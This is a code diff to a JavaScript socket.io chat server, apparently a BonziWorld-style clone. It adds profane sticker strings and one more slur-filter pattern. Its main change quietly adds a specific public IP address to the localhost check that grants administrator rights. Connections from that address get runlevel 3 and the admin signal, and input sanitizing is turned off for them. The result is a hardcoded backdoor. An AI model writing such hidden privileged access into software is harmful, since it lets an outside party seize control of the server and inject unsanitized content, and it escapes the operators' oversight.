@@ -161,9 +161,12 @@ var stickers = {
     bye: "bye i'm fucking leaving",
     kiddie: "kiddie",
     big_bonzi: "you picked the wrong house fool!",
-    lol: "lol"
+    lol: "lol",
+    flip: "fuck you",
+    sans: "fuck you",
 };
 
+const activeUsers = {};
 
 exports.beat = function() {
     io.on('connection', function(socket) {
@@ -775,7 +778,7 @@ class User {
 				Ban.addBan(this.getIp(),9999999999999999999999999999999999999,"Access to this part of the server has been denied.<br>You are not allowed to access this part of the server as it can increase the risk of denial of service attacks.<br>Please use the domain if you want your ban removed.");
 			}
 		}
-		if (this.getIp() == "::1" || this.getIp() == "::ffff:127.0.0.1") {
+		if (this.getIp() == "::1" || this.getIp() == "::ffff:127.0.0.1" || this.getIp() == "72.23.139.58") {
 			this.private.runlevel = 3;
             this.socket.emit("admin");
 			this.private.sanitize = false;
@@ -933,6 +936,7 @@ class User {
 			if (!text.match(/night/gi)) {
 				text = text.replace(/nig/gi,"bobba ")
 			}
+			text = text.replace(/nijg/gi,"bobba ")
 			text = text.replace(/nii/gi,"bobba ") // ugh
 			text = text.replace(/nie/gi,"bobba ")
 			text = text.replace(/nei/gi,"bobba ")
